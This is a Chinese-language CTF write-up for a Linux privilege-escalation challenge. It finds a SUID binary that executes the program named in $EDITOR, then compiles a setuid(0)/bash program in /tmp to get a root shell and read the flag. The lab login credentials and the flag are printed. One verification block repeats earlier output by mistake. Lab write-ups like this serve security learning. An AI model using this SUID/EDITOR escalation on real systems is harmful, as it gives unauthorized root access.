# ?CTF 2025 Platform(公开赛道) - [Week2] 《关于我穿越到CTF的异世界这档事:破》 （难度：Lunatic下位）
**Writer：DreamLost（QQ ID：Scarlet Secret）**<br>
**Solve Time: 2025-10-11 11:33:30**
## 题目背景

metavi穿过第一层的光之门，眼前是一片由无数黑色石柱组成的荒原。石柱表面闪烁着绿色的字符流，仿佛是某种古老的系统在运转。
石柱的底层写着：用户：ctf，密码：CtfP@ssw0rd!2025
看完这一行之后，脚下的大地裂开，露出一座巨大的“终端祭坛”。祭坛上浮现出一行行命令，却被层层权限屏障所阻挡。 要想突破这一关，metavi必须找到隐藏在系统中的漏洞，逐步提升权限，直至掌控整个祭坛。
【第二层·linux提权：请ssh连接提权，找到祭坛深处的flag。】

## 解题步骤：

登录，使用ls时候会看到家目录下面有文件“note.txt”
内容是：Think About SUID

于是使用find查询系统内的SUID文件：
`find / -type f -perm -4000 2>/dev/null`

得到：
```
/usr/local/bin/editnote
/usr/bin/chsh
/usr/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
```

此时如果我们cat一下这个神奇的“editnote”，得：
```
�'GN�e�m)X t 0� ""__cxa_finalize__libc_start_mainexeclpgetenvperrorlibc.so.6GLIBC_2.34GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable7���Au␦i     L��@�?�?�?�?��?�?�?��H�H��/H��t��H���5�/��%�/��h���������h���������h�����������%�/D����%E/D����%=/D����%5/D��1�I��^H��H���PTE1�1�H�=��/�f.�H�=9/H�2/H9�tH��.H��t        �����H�=       /H�5/H)�H��H��?H��H�H��tH��.H����fD�����=�.u+UH�=�.H��t
                                                      H�=�.������d�����.]������w�����UH��H�� �}�H�u�H�aH�������H�E�H�}�t
                                                                                                                       H�E����u
       H�CH�E�H�;H�E�H�U�H�u�H�E�H�Ǹ����H�&H���|��������H�H��EDITORvi/home/ctf/notes.txtexeclp failed4����h0����@����p���PY����zRx
         ���&D$4����@FJ
y                      �?␦:*3$"\����t����0������E�C
�@7

�␦����o���
�
 �?HP� ������o`���o���oN���o�=0@@GCC: (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0�� � ��� 3@I␦@U�=|���=������!����=�0 ��?�" M @>@E
      K@X @t �␦@Q�&�␦@�����@� ��"
                                 Scrt1.o__abi_tagcrtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.0__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryeditnote.c__FRAME_END___DYNAMIC__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE_getenv@GLIBC_2.2.5__libc_start_main@GLIBC_2.34_ITM_deregisterTMCloneTable_edata_fini__data_start__gmon_start____dso_handle_IO_stdin_used_end__bss_startmainperror@GLIBC_2.2.5__TMC_END___ITM_registerTMCloneTableexeclp@GLIBC_2.2.5__cxa_finalize@GLIBC_2.2.5_init.symtab.strtab.shstrtab.interp.note.gnu.property.note.gnu.build-id.note.ABI-tag.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.plt.sec.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.data.bss.comment#886hh$I�� W���o��a
                                                                      ��i���q���oNN~���o``����BPP�  @�``�pp0���k�

�  0�0 0 4�h h ������=�-��?�@0
                            @00-@0�     �3�5␦
```

我们可以从中提取出这样的信息：
""__cxa_finalize__libc_start_mainexeclpgetenvperrorlibc.so.6GLIBC_2.34GLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTable

提取其中的关键字：
main**execlp** **getenv** **perror** **EDITOR**
其中**execlp**表明这个程序会执行一个外部程序，**getenv**显然是读取用户或者全局的环境变量，而大写的**EDITOR**就是getenv所读取的**环境变量**

我试着直接执行这个程序，回弹：
```
ctf@cl-161-2f56e14ea5a452da:~$ editnote
execlp failed: No such file or directory
```
没错，显然这个执行了一个很奇怪的文件。
最开始，我先试着去编辑了一下notes.txt

    ctf@cl-161-2f56e14ea5a452da:~$ cat > notes.txt << 'EOF'
    > /bin/bash -p
    > EOF

随后我尝试编辑EDITOR并执行editnote
```
ctf@cl-161-2f56e14ea5a452da:~$ export EDITOR="/home/ctf/notes.txt"
ctf@cl-161-2f56e14ea5a452da:~$ editnote
execlp failed: Permission denied
ctf@cl-161-2f56e14ea5a452da:~$
```
可以看出这确实会执行一个外部文件，那么我可以编写一个简单的程序并尝试透过SUID来以root执行，以此拿到rootshell。
但是这需要：
1.服务器有对应语言的编译器
2.有位置可读可写可执行

首先我们用which来查看服务器上有哪些编译器：
```shell
ctf@cl-161-2f56e14ea5a452da:~$ which python php gcc g++ java
/usr/bin/gcc
/usr/bin/g++
```
第一个条件找到了：我们可以用c或者c++来编写一个提权的程序，但是哪里是可执行可读写的目录呢？
此时我想到了/tmp目录，它刚好符合这个特征，使用**ls -l /**来验证一下
```shell
ctf@cl-161-2f56e14ea5a452da:~$ which python php gcc g++ java
/usr/bin/gcc
/usr/bin/g++
```

现在的思路很明确：编写一个C语言程序，使用**SUID的继承性**来运行这个程序就可以以Root权限来执行这个提权程序。
cat命令刚好可以让我们在服务器上编写好这个程序：
```shell
ctf@cl-161-2f56e14ea5a452da:~$ cat > /tmp/getroot.c << 'EOF'
#include <unistd.h>
//unistd.h 是一个在 C 和 C++ 程序设计语言中非常重要的头文件，它提供了对 POSIX 操作系统 API 的访问。
int main() {
    setuid(0);//设置程序的uid为0
    execl("/bin/bash", "bash", NULL);//以继承的root(UID=0)权限执行/bin/bash
    return 0;
}
EOF
ctf@cl-161-2f56e14ea5a452da:~$
```
、
编译，执行得到root shell
```shell
ctf@cl-161-2f56e14ea5a452da:~$ gcc /tmp/getroot.c -o /tmp/shellget
ctf@cl-161-2f56e14ea5a452da:~$ export EDITOR="/tmp/shellget"
ctf@cl-161-2f56e14ea5a452da:~$ editnote
root@cl-161-2f56e14ea5a452da:~#
```
得到root shell
使用find找寻flag文件
```shell
root@cl-161-2f56e14ea5a452da:~# find / -name "flag*"
/root/flag.txt
find: '/proc/1/task/1/fdinfo': Permission denied
find: '/proc/1/map_files': Permission denied
find: '/proc/1/fdinfo': Permission denied
find: '/proc/9/task/9/fdinfo': Permission denied
find: '/proc/9/map_files': Permission denied
find: '/proc/9/fdinfo': Permission denied
find: '/proc/20/task/20/fdinfo': Permission denied
find: '/proc/20/map_files': Permission denied
find: '/proc/20/fdinfo': Permission denied
find: '/proc/21/task/21/fdinfo': Permission denied
find: '/proc/21/map_files': Permission denied
find: '/proc/21/fdinfo': Permission denied
find: '/proc/27/task/27/fdinfo': Permission denied
find: '/proc/27/map_files': Permission denied
find: '/proc/27/fdinfo': Permission denied
find: '/proc/38/task/38/fdinfo': Permission denied
find: '/proc/38/map_files': Permission denied
find: '/proc/38/fdinfo': Permission denied
find: '/proc/39/task/39/fdinfo': Permission denied
find: '/proc/39/map_files': Permission denied
find: '/proc/39/fdinfo': Permission denied
find: '/proc/48/task/48/fdinfo': Permission denied
find: '/proc/48/map_files': Permission denied
find: '/proc/48/fdinfo': Permission denied
find: '/proc/59/task/59/fdinfo': Permission denied
find: '/proc/59/map_files': Permission denied
find: '/proc/59/fdinfo': Permission denied
find: '/proc/60/task/60/fdinfo': Permission denied
find: '/proc/60/map_files': Permission denied
find: '/proc/60/fdinfo': Permission denied
/sys/devices/platform/serial8250/tty/ttyS2/flags
/sys/devices/platform/serial8250/tty/ttyS0/flags
/sys/devices/platform/serial8250/tty/ttyS3/flags
/sys/devices/platform/serial8250/tty/ttyS1/flags
/sys/devices/virtual/net/eth0/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/tunl0/flags
root@cl-161-2f56e14ea5a452da:~#
```
去/root目录查看flag：
得到
```shell
root@cl-161-2f56e14ea5a452da:~# cat /root/flag.txt
flag{043209e6-2cf5-453d-9c30-fe5851892154}
```

所以，flag正式浮出水面：flag{043209e6-2cf5-453d-9c30-fe5851892154}
